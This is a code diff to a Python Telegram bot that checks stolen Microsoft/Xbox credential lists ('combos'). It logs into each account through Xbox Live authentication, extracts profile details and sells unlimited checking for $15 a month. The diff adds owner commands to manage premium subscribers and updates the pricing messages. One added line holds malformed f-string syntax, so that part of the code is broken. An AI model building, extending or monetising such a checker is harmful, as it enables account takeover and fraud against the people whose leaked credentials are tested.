@@ -46,8 +46,13 @@ def load_premium_users():
     with open(PREMIUM_USERS_FILE, "r") as f:
         return set(line.strip() for line in f if line.strip())
 
+def save_premium_users(users_set):
+    with open(PREMIUM_USERS_FILE, "w") as f:
+        for uid in users_set:
+            f.write(f"{uid}\n")
+
 def check_user_subscription(user_id):
-    if user_id == OWNER_ID:
+    if user_id == OWNER_ID or str(user_id) in load_premium_users():
         return True
     try:
         member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
@@ -211,7 +216,6 @@ async def elite_check_account(combo):
             if not ms_token:
                 return "bad", "No Token"
 
-            # Elite Xbox Session Pipeline
             xb_payload = {
                 "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                 "RelyingParty": "http://auth.xboxlive.com", 
@@ -238,7 +242,6 @@ async def elite_check_account(combo):
 
             xsts_token = xsts_res.json()['Token']
             
-            # Deep Profile Extraction Endpoint
             prof_res = await session.get(
                 "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier,TenureLevel", 
                 headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
@@ -290,6 +293,48 @@ def send_welcome(message):
         )
         return
     show_main_menu(message)
+
+# --- أوامر المطور لإدارة البريميوم ---
+@bot.message_handler(commands=['addprem'])
+def add_premium_cmd(message):
+    if message.from_user.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        target_id = parts[1]
+        prem_users = load_premium_users()
+        prem_users.add(target_id)
+        save_premium_users(prem_users)
+        bot.reply_to(message, f"✅ User `{target_id}` added to Premium (1 Month) successfully!", parse_mode="Markdown")
+    except Exception:
+        bot.reply_to(message, "⚠️ Use format: `/addprem USER_ID`", parse_mode="Markdown")
+
+@bot.message_handler(commands=['delprem'])
+def del_premium_cmd(message):
+    if message.from_user.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        target_id = parts[1]
+        prem_users = load_premium_users()
+        if target_id in prem_users:
+            prem_users.remove(target_id)
+            save_premium_users(prem_users)
+            bot.reply_to(message, f"❌ User `{target_id}` removed from Premium.", parse_mode="Markdown")
+        else:
+            bot.reply_to(message, "⚠️ User ID not found in premium list.")
+    except Exception:
+        bot.reply_to(message, "⚠️ Use format: `/delprem USER_ID`", parse_mode="Markdown")
+
+@bot.message_handler(commands=['premkeys'])
+def list_premium_cmd(message):
+    if message.from_user.id != OWNER_ID:
+        return
+    prem_users = load_premium_users()
+    if not prem_users:
+        bot.reply_to(message, "📂 No premium users found.")
+    else:
+        bot.reply_to(message, f"💎 **Premium Users List:**\n" + "\n".join([`f"• `{uid}`` for uid in prem_users]), parse_mode="Markdown")
 
 def show_main_menu(message):
     chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
@@ -380,12 +425,12 @@ def callback_query(call):
         bot.answer_callback_query(call.id, "⏹️ Scan stopped.")
 
     elif call.data == "buy_premium":
-        bot.answer_callback_query(call.id, "💎 Premium Plan: $15/Month\nContact: @r1ivk", show_alert=True)
+        bot.answer_callback_query(call.id, "💎 Premium Plan ($15/Month - Unlimited Lines)\nContact Owner: @r1ivk", show_alert=True)
 
     elif call.data == "my_account":
         today = str(date.today())
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: Elite Pipeline", show_alert=True)
+            bot.answer_callback_query(call.id, "Status: Premium / Owner (Unlimited)\nMode: Elite Pipeline", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
             bot.answer_callback_query(call.id, f"Status: Free ({used}/5000 lines)\nMode: Elite Pipeline", show_alert=True)
@@ -410,7 +455,7 @@ def handle_docs(message):
 
         allowed, count_allowed = check_daily_limit(chat_id, len(lines))
         if not allowed or count_allowed <= 0:
-            bot.reply_to(message, "⚠️ Daily limit reached! Upgrade to Premium.")
+            bot.reply_to(message, "⚠️ Daily limit reached! Upgrade to Premium ($15/Month).")
             if os.path.exists(local_path): os.remove(local_path)
             return
 
